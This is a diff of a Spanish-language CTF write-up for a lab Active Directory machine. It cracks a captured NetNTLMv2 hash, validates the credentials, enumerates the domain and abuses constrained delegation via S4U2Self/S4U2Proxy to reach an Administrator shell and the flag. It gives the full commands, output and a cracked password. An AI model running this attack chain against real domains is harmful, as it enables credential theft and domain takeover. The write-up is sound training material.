@@ -207,24 +207,164 @@ responder -I tun0
 
 ![[Pasted image 20261026020232.png]]
 
-## 8. Cracking del hash (pendiente)
+## 8. Cracking del hash
 
-Ese hash **no es la contraseña**: es una respuesta criptográfica al reto del servidor. Hay dos caminos:
-
-**a) Cracking offline** — hashcat en modo `5600` (NetNTLMv2) o john con formato `netntlmv2`:
+Ese hash **no es la contraseña**: es la respuesta criptográfica al reto del servidor, así que hay que crackearlo offline con hashcat en modo `5600` (NetNTLMv2):
 
 ```
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
-
 ```
 
-
-por lo cual encontramos contraseña 
+La contraseña sale a la vista:
 
 ```
 1summerlove!
-``` 
+```
 
-domo podemos ver que tenemos credenciales 
+**Credenciales obtenidas:** `ctf.local\svc.scanner` → `1summerlove!`
+
+## 9. Validar las credenciales con NetExec
+
+Antes de seguir, comprobamos que funcionan y miramos la ficha que devuelve el servidor:
+
+```
+nxc smb 10.65.172.243 -u 'svc.scanner' -p '1summerlove!' --continue-on-success
+```
 
 ![[Pasted image 20261027004943.png]]
+
+```
+[+] ctf.local\svc.scanner : 1summerlove!
+```
+
+> ⚠️ **Cambio de IP:** durante la práctica la máquina se volvió a desplegar (aparece como *"Proxy nueva"*) y pasó de `10.65.144.56` a **`10.65.172.243`**. Las secciones 1-7 son con la IP original; de aquí en adelante se usa la nueva.
+
+La cabecera confirma el resto: Windows Server 2019 Build 17763, `domain:ctf.local`, `signing:True` (el relay SMB sigue descartado), `SMBv1:None` y `Null Auth:True`.
+
+## 10. Enumeración con credenciales
+
+**Usuarios** (`--users`): salen las 7 cuentas del dominio con su descripción.
+
+![[Captura de pantalla 2026-10-27 011718.png]]
+
+| Cuenta | Descripción |
+|---|---|
+| `Administrator` | Built-in account for administering the computer/domain |
+| `Guest` | Built-in account for guest access |
+| `krbtgt` | Key Distribution Center Service Account |
+| `svc.scanner` | IT File Scanner Service |
+| `svc.mssql` | MSSQL Service Account |
+| `helpdesk.bob` | Help Desk - Bob (left company) |
+| `it.admin` | IT Admin (role change) |
+
+**Grupos** (`nxc ldap ... --groups`):
+
+![[Pasted image 20261027012119.png]]
+
+Destacan **Administrators** (3 miembros) y **Backup Operators** (1 miembro), coherente con el `svc.mssql` de la checklist; el resto son los grupos por defecto de Active Directory.
+
+**RID brute force** (`--rid-brute`), el mismo directorio pero indexado por RID:
+
+![[Pasted image 20261027012547.png]]
+
+- `500` → `Administrator`, `501` → `Guest`, `1008` → `DC01$`.
+- `1111` → `svc.scanner`, `1112` → `svc.mssql`, `1113` → `helpdesk.bob`, `1114` → `it.admin`.
+
+## 11. Delegación restringida con transición de protocolo
+
+Con las credenciales validadas, toca mirar delegaciones:
+
+```
+impacket-findDelegation ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.65.172.243
+```
+
+![[Pasted image 20261027013202.png]]
+
+```
+AccountName   AccountType  DelegationType                       DelegationRightsTo   SPN Exists
+DC01$         Computer     Unconstrained                        N/A                   Yes
+svc.scanner   Person       Constrained w/ Protocol Transition   cifs/DC01             No
+svc.scanner   Person       Constrained w/ Protocol Transition   cifs/DC01.ctf.local   No
+```
+
+Este es el corazón de la máquina: `svc.scanner` tiene **delegación restringida con transición de protocolo** hacia `cifs/DC01`. Traducido, le podemos pedir al KDC: *"dame un ticket para acceder a CIFS en DC01 como si fuera otro usuario"*, y la transición de protocolo hace que funcione **sin conocer la contraseña** de ese usuario. Eso se consigue con el par **S4U2Self + S4U2Proxy**:
+
+- **S4U2Self** → pide un ticket que representa a `Administrator` para `svc.scanner`.
+- **S4U2Proxy** → usa ese ticket para pedir un service ticket a `cifs/DC01` **como Administrator**.
+
+**Primer intento — fallo:**
+
+```
+impacket-getST -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.65.172.243 ctf.local/svc.scanner:'1summerlove!'
+```
+
+![[Pasted image 20261027013542.png]]
+
+```
+[*] Getting TGT for user
+[*] Requesting S4U2self ...
+[*] Requesting S4U2Proxy ...
+[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+```
+
+**Segundo intento — ticket conseguido.** El fallo estaba en la resolución de nombres: `/etc/hosts` solo tenía `ctf.local` y faltaban `DC01.ctf.local` y `DC01` (la guía los incluye). Completada la línea, el mismo comando va limpio y guarda el ticket:
+
+```
+10.65.172.243 DC01.ctf.local ctf.local DC01
+```
+
+![[Pasted image 20261027015232.png]]
+
+```
+[*] Getting TGT for user
+[*] Requesting S4U2self ...
+[*] Requesting S4U2Proxy ...
+[*] Saving ticket in administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+```
+
+El `.ccache` aparece en el directorio de trabajo (se ve en el `ls` de la captura). Para usarlo hay que exportarlo con el nombre **exacto** del archivo; si no, `smbexec` se queja con errores raros (`No such file or directory`, `Name or service not known`), y en ese caso lo más fácil es `unset KRB5CCNAME` y volver a empezar:
+
+```
+export KRB5CCNAME=./administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+```
+
+## 12. Shell como Administrator con smbexec
+
+Con el ticket en la variable, la conexión usa Kerberos (`-k`) y ya no pide contraseña (`-no-pass`):
+
+```
+impacket-smbexec -k -no-pass ctf.local/Administrator@DC01.ctf.local
+```
+
+![[Pasted image 20261027015251.png]]
+
+```
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+## 13. Bandera
+
+Ya dentro como Administrator, buscamos la bandera en el escritorio del administrador:
+
+```
+dir c:\Users
+dir c:\Users\Administrator\Desktop
+type c:\Users\Administrator\Desktop\flag.txt
+```
+
+![[Pasted image 20261027015618.png]]
+
+```
+THM{54U253tf_C0n5tr1ned_D3l3g4t10n_2_DA}
+```
+
+
+**Lecciones de la máquina:**
+
+- Abuso de **delegación restringida con transición de protocolo** (S4U2Self + S4U2Proxy) para obtener un ticket de otro usuario sin su contraseña.
+- Captura de **hashes NTLM** con un cebo en un compartido que un servicio recorre periódicamente.
+- En Kerberos, la **resolución de nombres es obligatoria**: sin `DC01.ctf.local` en `/etc/hosts`, `getST` falla con `KDC_ERR_S_PRINCIPAL_UNKNOWN`.
+
+**Guía de referencia:** [djalilayed/tryhackme — proxy](https://github.com/djalilayed/tryhackme/tree/main/proxy).
+
